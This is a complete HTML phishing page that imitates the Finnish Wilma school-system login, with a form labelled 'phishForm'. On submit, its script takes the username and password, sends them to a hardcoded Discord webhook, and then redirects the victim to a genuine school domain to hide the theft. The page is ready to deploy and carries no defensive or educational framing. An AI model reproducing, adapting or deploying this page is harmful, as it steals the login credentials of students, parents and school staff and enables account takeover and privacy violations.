<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Wilma Login</title>
    <!-- Your CSS links -->
    <style>
        /* Add minimal CSS if CDN fails */
        body { font-family: sans-serif; margin: 0; padding: 20px; }
        .login-box { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; }
        input, button { width: 100%; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Kirjaudu Wilmaan</h2>
        <form id="phishForm">
            <input type="text" id="username" placeholder="Käyttäjätunnus" required>
            <input type="password" id="password" placeholder="Salasana" required>
            <button type="submit">Kirjaudu sisään</button>
        </form>
    </div>

    <script>
    document.getElementById('phishForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Send to Discord
        await fetch('https://discord.com/api/webhooks/1335234608458891375/4iUykKNybf7HW4j4VMXF6MSa1j6IRVGP3--L9NgDjIz5v_TXu3dl0R22Y7CeiT47PQeZ', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `User: ${username}\nPass: ${password}`
            })
        });
        
        // Redirect
        window.location.href = 'https://tyk.inschool.fi';
    });
    </script>
</body>
</html>
